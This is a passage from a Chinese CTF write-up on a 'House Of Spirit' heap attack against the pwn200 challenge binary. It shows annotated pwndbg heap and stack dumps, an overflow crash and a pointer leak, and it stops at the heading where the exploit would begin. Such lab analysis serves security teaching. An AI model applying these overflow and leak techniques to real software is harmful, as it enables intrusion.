<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="function">House Of Spirit gdb pwn200</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">7.11</span><span class="number">.1</span><span class="number">-0u</span>buntu1~<span class="number">16.5</span>)</span> 7.11.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">License GPLv3+: GNU GPL version 3 <span class="keyword">or</span> later &lt;http:<span class="comment">//gnu.org/licenses/gpl.html&gt;</span></span></span><br><span class="line"><span class="function">This is <span class="built_in">free</span> software: you are <span class="built_in">free</span> to change <span class="keyword">and</span> redistribute it.</span></span><br><span class="line"><span class="function">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">and</span> &quot;show warranty&quot; <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="function">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span></span><br><span class="line"><span class="function">Type &quot;show configuration&quot; <span class="keyword">for</span> configuration details.</span></span><br><span class="line"><span class="function">For bug reporting instructions, please see:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/bugs/&gt;.</span></span></span><br><span class="line"><span class="function">Find the GDB manual <span class="keyword">and</span> other documentation resources online at:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/documentation/&gt;.</span></span></span><br><span class="line"><span class="function">For help, type &quot;help&quot;.</span></span><br><span class="line"><span class="function">Type &quot;apropos word&quot; to search <span class="keyword">for</span> commands related to &quot;word&quot;...</span></span><br><span class="line"><span class="function">pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="keyword">for</span> a <span class="built_in">list</span>.</span></span><br><span class="line"><span class="function">pwndbg: created $rebase, $ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from pwn200...<span class="params">(no debugging symbols found)</span>...done.</span></span><br><span class="line"><span class="function">pwndbg&gt; r</span></span><br><span class="line"><span class="function">Starting program: /home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200</span></span><br><span class="line"><span class="function">who are u?</span></span><br><span class="line"><span class="function">123</span></span><br><span class="line"><span class="function">123, welcome to ISCC~</span></span><br><span class="line"><span class="function">give me your id ~~?</span></span><br><span class="line"><span class="function">456</span></span><br><span class="line"><span class="function">give me money~</span></span><br><span class="line"><span class="function">789</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>=======EASY HOTEL========</span><br><span class="line"><span class="number">1.</span> check in</span><br><span class="line"><span class="number">2.</span> check out</span><br><span class="line"><span class="number">3.</span> goodbye</span><br><span class="line">your choice :</span><br></pre></td></tr></table></figure>

<p>查看一下内存分布：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603248977264-a291c4ee-a522-4a23-b27f-62dcd484fff0.png#align=left&display=inline&height=359&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021105605.png&originHeight=359&originWidth=1063&size=82637&status=done&style=none&width=1063" alt="QQ截图20201021105605.png"><br>查看一下堆的内容：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0</span>x603000</span><br><span class="line">Size: <span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">Top chunk</span><br><span class="line">Addr: <span class="number">0</span>x603050</span><br><span class="line">Size: <span class="number">0</span>x00</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;main_arena</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b20 &lt;main_arena&gt;:	<span class="number">0</span>x0000000100000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b30 &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b40 &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b50 &lt;main_arena+<span class="number">48</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b60 &lt;main_arena+<span class="number">64</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b70 &lt;main_arena+<span class="number">80</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000603050 <span class="comment">#top_chunk</span></span><br><span class="line"><span class="number">0</span>x7ffff7dd1b80 &lt;main_arena+<span class="number">96</span>&gt;:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x00007ffff7dd1b78</span><br><span class="line"><span class="number">0</span>x7ffff7dd1b90 &lt;main_arena+<span class="number">112</span>&gt;:	<span class="number">0</span>x00007ffff7dd1b78	<span class="number">0</span>x00007ffff7dd1b88</span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0</span>x603000</span><br><span class="line"><span class="number">0</span>x603000:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000051 <span class="comment">#chunk</span></span><br><span class="line"><span class="number">0</span>x603010:	<span class="number">0</span>x00007fff0a393837	<span class="number">0</span>x0000000000000000</span><br><span class="line">					<span class="comment">#393837(小端序)，也就是我们输入的789,至于前面的7fff应该是之前写入的内容</span></span><br><span class="line"><span class="number">0</span>x603020:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x603030:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x603040:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x603050:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000020fb1 <span class="comment">#top_chunk</span></span><br><span class="line"><span class="number">0</span>x603060:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">......（省略内容均为空）</span><br><span class="line"><span class="number">0</span>x6030e0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt; stack</span><br></pre></td></tr></table></figure>

<p>再来看一下此时的栈：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603251076461-3ee189ad-7e01-4511-9d7f-f0995c01cf0a.png#align=left&display=inline&height=857&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021113105.png&originHeight=857&originWidth=1185&size=240813&status=done&style=none&width=1185" alt="QQ截图20201021113105.png"><br>查看这个程序的调用栈：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1603250049216-823ea545-f12b-43fe-a32a-5dfc6ca2b63e.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20201021111330.png&originHeight=192&originWidth=1248&size=43954&status=done&style=none&width=1248" alt="QQ截图20201021111330.png"><br>查看一下此时 0x7fffffffdc98 地址的内容：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0</span>x7fffffffdc98</span><br><span class="line"><span class="number">0</span>x7fffffffdc98:	<span class="number">0</span>x0000000000400824	<span class="number">0</span>x000000000000000e</span><br><span class="line"><span class="number">0</span>x7fffffffdca8:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x00007fffffffdcd0</span><br><span class="line"><span class="number">0</span>x7fffffffdcb8:	<span class="number">0</span>x00000000004009e0	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdcc8:	<span class="number">0</span>x00007ffff7ffe168	<span class="number">0</span>x00007fffffffdd20</span><br><span class="line"><span class="number">0</span>x7fffffffdcd8:	<span class="number">0</span>x0000000000400a8c	<span class="number">0</span>x00007fff0a393837</span><br><span class="line">																		<span class="comment">#buf输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdce8:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdcf8:	<span class="number">0</span>x00007ffff7a43ea0	<span class="number">0</span>x0000000000000009</span><br><span class="line"><span class="number">0</span>x7fffffffdd08:	<span class="number">0</span>x00000000004008b5	<span class="number">0</span>x0000000000363534</span><br><span class="line">																		<span class="comment">#id输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd18:	<span class="number">0</span>x0000000000603010	<span class="number">0</span>x00007fffffffdd80</span><br><span class="line">								<span class="comment">#chunk_data的起始地址</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd28:	<span class="number">0</span>x0000000000400b34	<span class="number">0</span>x00007ffff7dd18e0</span><br><span class="line"><span class="number">0</span>x7fffffffdd38:	<span class="number">0</span>x00007ffff7fdc700	<span class="number">0</span>x0000000000000003</span><br><span class="line"><span class="number">0</span>x7fffffffdd48:	<span class="number">0</span>x00000000000001c8	<span class="number">0</span>x00007fff00333231</span><br><span class="line">																		<span class="comment">#name输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd58:	<span class="number">0</span>x00007ffff7a7cfc4	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdd68:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x00007fffffffdd80</span><br><span class="line"><span class="number">0</span>x7fffffffdd78:	<span class="number">0</span>x00000000004007dd	<span class="number">0</span>x00007fffffffdda0</span><br><span class="line"><span class="number">0</span>x7fffffffdd88:	<span class="number">0</span>x0000000000400b59	<span class="number">0</span>x00007fffffffde88</span><br><span class="line">								<span class="comment">#sub_400A8E的返回地址</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd98:	<span class="number">0</span>x0000000100000000	<span class="number">0</span>x0000000000400b60</span><br><span class="line">																		<span class="comment">#rbp的内容</span></span><br><span class="line"><span class="number">0</span>x7fffffffdda8:	<span class="number">0</span>x00007ffff7a2d840	<span class="number">0</span>x0000000000000001</span><br><span class="line"><span class="number">0</span>x7fffffffddb8:	<span class="number">0</span>x00007fffffffde88	<span class="number">0</span>x00000001f7ffcca0</span><br><span class="line"><span class="number">0</span>x7fffffffddc8:	<span class="number">0</span>x0000000000400b36	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffddd8:	<span class="number">0</span>x93858522fbc51f63	<span class="number">0</span>x00000000004006b0</span><br><span class="line"><span class="number">0</span>x7fffffffdde8:	<span class="number">0</span>x00007fffffffde80	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffddf8:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x6c7a7a5d56651f63</span><br><span class="line"><span class="number">0</span>x7fffffffde08:	<span class="number">0</span>x6c7a6ae742f51f63	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffde18:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>来看一下溢出之后的情况，我们输入程序能输入的最大空间，重新调试一下：（可以结合 IDA）</p>
<blockquote>
<p>可以多次尝试数据长度直到程序异常或崩溃</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">name：<span class="number">11111111111111111111111111111111111111111111111</span></span><br><span class="line">id：<span class="number">222</span></span><br><span class="line">buf：<span class="number">333333333333333333333333333333333333333333333333333333333333333</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="function">House Of Spirit gdb pwn200</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">7.11</span><span class="number">.1</span><span class="number">-0u</span>buntu1~<span class="number">16.5</span>)</span> 7.11.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">License GPLv3+: GNU GPL version 3 <span class="keyword">or</span> later &lt;http:<span class="comment">//gnu.org/licenses/gpl.html&gt;</span></span></span><br><span class="line"><span class="function">This is <span class="built_in">free</span> software: you are <span class="built_in">free</span> to change <span class="keyword">and</span> redistribute it.</span></span><br><span class="line"><span class="function">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">and</span> &quot;show warranty&quot; <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="function">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span></span><br><span class="line"><span class="function">Type &quot;show configuration&quot; <span class="keyword">for</span> configuration details.</span></span><br><span class="line"><span class="function">For bug reporting instructions, please see:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/bugs/&gt;.</span></span></span><br><span class="line"><span class="function">Find the GDB manual <span class="keyword">and</span> other documentation resources online at:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/documentation/&gt;.</span></span></span><br><span class="line"><span class="function">For help, type &quot;help&quot;.</span></span><br><span class="line"><span class="function">Type &quot;apropos word&quot; to search <span class="keyword">for</span> commands related to &quot;word&quot;...</span></span><br><span class="line"><span class="function">pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="keyword">for</span> a <span class="built_in">list</span>.</span></span><br><span class="line"><span class="function">pwndbg: created $rebase, $ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from pwn200...<span class="params">(no debugging symbols found)</span>...done.</span></span><br><span class="line"><span class="function">pwndbg&gt; r</span></span><br><span class="line"><span class="function">Starting program: /home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200</span></span><br><span class="line"><span class="function">who are u?</span></span><br><span class="line"><span class="function">111111111111111111111111111111111111111111111111</span></span><br><span class="line"><span class="function">111111111111111111111111111111111111111111111111, welcome to ISCC~</span></span><br><span class="line"><span class="function">give me your id ~~?</span></span><br><span class="line"><span class="function">222</span></span><br><span class="line"><span class="function">give me money~</span></span><br><span class="line"><span class="function">333333333333333333333333333333333333333333333333333333333333333</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Program received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="function">__<span class="title">strcpy_sse2_unaligned</span> <span class="params">()</span> at ../sysdeps/x86_64/multiarch/<span class="built_in">strcpy</span>-sse2-unaligned.S:313</span></span><br><span class="line"><span class="function">313	../sysdeps/x86_64/multiarch/<span class="built_in">strcpy</span>-sse2-unaligned.S: No such file <span class="keyword">or</span> directory.</span></span><br><span class="line"><span class="function">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function"> RAX  0<span class="title">xa33333333333333</span> <span class="params">(<span class="string">&#x27;3333333\n&#x27;</span>)</span></span></span><br><span class="line"><span class="function"> RBX  0x0</span></span><br><span class="line"><span class="function"> RCX  0x20</span></span><br><span class="line"><span class="function"> RDX  0x0</span></span><br><span class="line"><span class="function"> RDI  0<span class="title">xa33333333333333</span> <span class="params">(<span class="string">&#x27;3333333\n&#x27;</span>)</span></span></span><br><span class="line"><span class="function"> RSI  0x7fffffffdce0 ◂— 0<span class="title">x3333333333333333</span> <span class="params">(<span class="string">&#x27;33333333&#x27;</span>)</span></span></span><br><span class="line"><span class="function"> R8   0x7ffff7fdc700 ◂— add    bh, al <span class="comment">/* 0x7ffff7fdc700 */</span></span></span><br><span class="line"><span class="function"> R9   0xd</span></span><br><span class="line"><span class="function"> R10  0x5d</span></span><br><span class="line"><span class="function"> R11  0<span class="title">x7ffff7ab2a50</span> <span class="params">(__strcpy_sse2_unaligned)</span> ◂— mov    rcx, rsi</span></span><br><span class="line"><span class="function"> R12  0x4006b0 ◂— <span class="keyword">xor</span>    ebp, ebp</span></span><br><span class="line"><span class="function"> R13  0x7fffffffde80 ◂— 0x1</span></span><br><span class="line"><span class="function"> R14  0x0</span></span><br><span class="line"><span class="function"> R15  0x0</span></span><br><span class="line"><span class="function"> RBP  0x7fffffffdd20 —▸ 0x7fffffffdd80 —▸ 0x7fffffffdda0 —▸ 0x400b60 ◂— push   r15</span></span><br><span class="line"><span class="function"> RSP  0x7fffffffdcd8 —▸ 0x400a77 ◂— mov    rax, qword ptr [rbp - 8]</span></span><br><span class="line"><span class="function"> RIP  0<span class="title">x7ffff7ab2c91</span> <span class="params">(__strcpy_sse2_unaligned+<span class="number">577</span>)</span> ◂— movdqu xmmword ptr [rdi], xmm1</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function"> ► 0x7ffff7ab2c91 &lt;__strcpy_sse2_unaligned+577&gt;    movdqu xmmword ptr [rdi], xmm1</span></span><br><span class="line"><span class="function">   0x7ffff7ab2c95 &lt;__strcpy_sse2_unaligned+581&gt;    pmovmskb edx, xmm0</span></span><br><span class="line"><span class="function">   0x7ffff7ab2c99 &lt;__strcpy_sse2_unaligned+585&gt;    test   rdx, rdx</span></span><br><span class="line"><span class="function">   0x7ffff7ab2c9c &lt;__strcpy_sse2_unaligned+588&gt;    jne    __strcpy_sse2_unaligned+672 &lt;__strcpy_sse2_unaligned+672&gt;</span></span><br><span class="line"><span class="function">    ↓</span></span><br><span class="line"><span class="function">   0x7ffff7ab2cf0 &lt;__strcpy_sse2_unaligned+672&gt;    add    rsi, 0x10</span></span><br><span class="line"><span class="function">   0x7ffff7ab2cf4 &lt;__strcpy_sse2_unaligned+676&gt;    add    rdi, 0x10</span></span><br><span class="line"><span class="function">   0x7ffff7ab2cf8 &lt;__strcpy_sse2_unaligned+680&gt;    bsf    rdx, rdx</span></span><br><span class="line"><span class="function">   0x7ffff7ab2cfc &lt;__strcpy_sse2_unaligned+684&gt;    lea    r11, [rip + 0xe20c5]</span></span><br><span class="line"><span class="function">   0x7ffff7ab2d03 &lt;__strcpy_sse2_unaligned+691&gt;    movsxd rcx, dword ptr [r11 + rdx*4]</span></span><br><span class="line"><span class="function">   0x7ffff7ab2d07 &lt;__strcpy_sse2_unaligned+695&gt;    lea    rcx, [r11 + rcx]</span></span><br><span class="line"><span class="function">   0x7ffff7ab2d0b &lt;__strcpy_sse2_unaligned+699&gt;    jmp    rcx</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function">00:0000│ rsp  0x7fffffffdcd8 —▸ 0x400a77 ◂— mov    rax, qword ptr [rbp - 8]</span></span><br><span class="line"><span class="function">01:0008│ rsi  0x7fffffffdce0 ◂— 0<span class="title">x3333333333333333</span> <span class="params">(<span class="string">&#x27;33333333&#x27;</span>)</span></span></span><br><span class="line"><span class="function">... ↓</span></span><br><span class="line"><span class="function">────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function"> ► f 0     7ffff7ab2c91 __strcpy_sse2_unaligned+577</span></span><br><span class="line"><span class="function">   f 1           400a77</span></span><br><span class="line"><span class="function">   f 2           400b34</span></span><br><span class="line"><span class="function">   f 3           400b59</span></span><br><span class="line"><span class="function">   f 4     7ffff7a2d840 __libc_start_main+240</span></span><br><span class="line"><span class="function">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p>再来看一下 0x7fffffffdc98 的内存：（stack）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0</span>x7fffffffdc98</span><br><span class="line"><span class="number">0</span>x7fffffffdc98:	<span class="number">0</span>x00007ffff7a8782b	<span class="number">0</span>x000000000000000e</span><br><span class="line"><span class="number">0</span>x7fffffffdca8:	<span class="number">0</span>x00007ffff7dd2620	<span class="number">0</span>x0000000000400cb7</span><br><span class="line"><span class="number">0</span>x7fffffffdcb8:	<span class="number">0</span>x00007ffff7a7c80a	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffdcc8:	<span class="number">0</span>x00007ffff7ffe168	<span class="number">0</span>x0000000000000001</span><br><span class="line"><span class="number">0</span>x7fffffffdcd8:	<span class="number">0</span>x0000000000400a77	<span class="number">0</span>x3333333333333333</span><br><span class="line">																		<span class="comment">#buf输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdce8:	<span class="number">0</span>x3333333333333333	<span class="number">0</span>x3333333333333333</span><br><span class="line"><span class="number">0</span>x7fffffffdcf8:	<span class="number">0</span>x3333333333333333	<span class="number">0</span>x3333333333333333</span><br><span class="line"><span class="number">0</span>x7fffffffdd08:	<span class="number">0</span>x3333333333333333	<span class="number">0</span>x3333333333333333</span><br><span class="line">																		<span class="comment">#id输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd18:	<span class="number">0</span>x0a33333333333333	<span class="number">0</span>x00007fffffffdd80</span><br><span class="line">								<span class="comment">#chunk_data的起始地址</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd28:	<span class="number">0</span>x0000000000400b34	<span class="number">0</span>x00007ffff7dd18e0</span><br><span class="line"><span class="number">0</span>x7fffffffdd38:	<span class="number">0</span>x00007ffff7fdc700	<span class="number">0</span>x000000000000002f</span><br><span class="line"><span class="number">0</span>x7fffffffdd48:	<span class="number">0</span>x00000000000000de	<span class="number">0</span>x3131313131313131</span><br><span class="line">																		<span class="comment">#name输入到了这里</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd58:	<span class="number">0</span>x3131313131313131	<span class="number">0</span>x3131313131313131</span><br><span class="line"><span class="number">0</span>x7fffffffdd68:	<span class="number">0</span>x3131313131313131	<span class="number">0</span>x3131313131313131</span><br><span class="line"><span class="number">0</span>x7fffffffdd78:	<span class="number">0</span>x3131313131313131	<span class="number">0</span>x00007fffffffdda0 <span class="comment">#printf会泄露的内容</span></span><br><span class="line"><span class="number">0</span>x7fffffffdd88:	<span class="number">0</span>x0000000000400b59	<span class="number">0</span>x00007fffffffde88</span><br><span class="line"><span class="number">0</span>x7fffffffdd98:	<span class="number">0</span>x0000000100000000	<span class="number">0</span>x0000000000400b60</span><br><span class="line"><span class="number">0</span>x7fffffffdda8:	<span class="number">0</span>x00007ffff7a2d840	<span class="number">0</span>x0000000000000001</span><br><span class="line"><span class="number">0</span>x7fffffffddb8:	<span class="number">0</span>x00007fffffffde88	<span class="number">0</span>x00000001f7ffcca0</span><br><span class="line"><span class="number">0</span>x7fffffffddc8:	<span class="number">0</span>x0000000000400b36	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffddd8:	<span class="number">0</span>x1efe2cb42350acf8	<span class="number">0</span>x00000000004006b0</span><br><span class="line"><span class="number">0</span>x7fffffffdde8:	<span class="number">0</span>x00007fffffffde80	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffddf8:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>xe101d3cb8ef0acf8</span><br><span class="line"><span class="number">0</span>x7fffffffde08:	<span class="number">0</span>xe101c3719a60acf8	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x7fffffffde18:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>这就是溢出的情况，从上面可以看到，当输入 buf 之后，程序会直接崩溃。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先贴上 exp 吧，可以先大致看一下：</p>
